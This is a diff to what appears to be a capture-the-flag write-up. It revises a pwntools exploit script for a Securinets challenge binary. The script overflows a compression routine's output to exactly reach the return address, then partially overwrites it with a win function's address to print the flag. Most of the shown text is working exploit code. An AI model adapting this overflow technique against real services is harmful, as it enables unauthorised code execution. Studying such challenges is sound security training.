@@ -823,38 +823,53 @@ HOST = 'pwn-14caf623.p1.securinets.tn'
 PORT = 9000
 
 # Connect to remote
-p = remote(HOST, PORT)
-# For local testing: p = process('./main')
+io = remote(HOST, PORT)
+# For local testing: io = process('./main')
 
 log.info("Building payload...")
 
-# Step 1: Create payload to reach return address (792 bytes)
-payload = b'AB' * 198  # 396 input bytes → 792 compressed
+# Step 1: Generate 396 unique bytes
+# Each unique byte compresses to 2 bytes: [byte, 0x01]
+# Total: 396 × 2 = 792 bytes (exactly reaches return address)
+unique_bytes = bytes([i % 256 for i in range(396)])
 
-# Step 2: Append bytes to overwrite return address
-# win+1 = 0x4011a6 → little-endian: a6 11 40 00 00 00 00 00
-# We create 'a6 11' using 17 bytes of 0xa6 (17 = 0x11 in hex)
-payload += b'\xa6' * 17  # 17 input bytes → 2 compressed (a6 11)
+# Step 2: Append win+1 address bytes
+# win+1 = 0x4011a6 → we only need to overwrite first 2 bytes: a6 11
+# Since PIE is disabled, upper bytes are already correct (0x00 00 00 00 40)
+# 17 bytes of 0xa6 compress to: [a6, 11] (17 decimal = 0x11 hex)
+win_plus_1 = b'\xa6' * 0x11  # 0x11 = 17 decimal
+
+# Complete payload: 396 + 17 = 413 bytes
+payload = unique_bytes + win_plus_1
 
 log.success(f"Payload size: {len(payload)} bytes")
-log.success(f"Expected compressed size: 794 bytes")
+log.info(f"Compressed size: 792 + 2 = 794 bytes")
 
-# Step 3: Send payload
+# Step 3: Send payload (use sendafter, NOT sendlineafter!)
+# sendlineafter adds \n which gets compressed and corrupts the address
 log.info("Sending payload...")
-p.sendlineafter(b'data to compress : ', payload)
+io.sendafter(b"data to compress :", payload)
 
-# Step 4: Receive compressed output (just to clear the buffer)
-p.recvuntil(b'compressed data  : ')
-compressed = p.recvline().strip()
-log.info(f"Compressed output length: {len(compressed)//2} bytes")
+# Step 4: Trigger return by exiting the loop
+log.info("Triggering exploit with 'exit'...")
+io.sendlineafter(b"data to compress :", b"exit")
 
-# Step 5: Trigger return by exiting the loop
-log.info("Triggering return to win+1...")
-p.sendlineafter(b'data to compress : ', b'exit')
+# Step 5: Get the flag!
+log.success("Receiving flag...")
+output = io.recvall(timeout=5)
 
-# Step 6: Get the flag!
-log.success("Getting flag...")
-p.interactive()
+print("\n" + "="*50)
+if b"Securinets{" in output:
+    flag_start = output.find(b"Securinets{")
+    flag_end = output.find(b"}", flag_start) + 1
+    flag = output[flag_start:flag_end]
+    print(f"🚩 FLAG: {flag.decode()}")
+else:
+    print("Raw output:")
+    print(output.decode(errors='ignore'))
+print("="*50)
+
+io.close()
 ```
 
 ### Expected Output
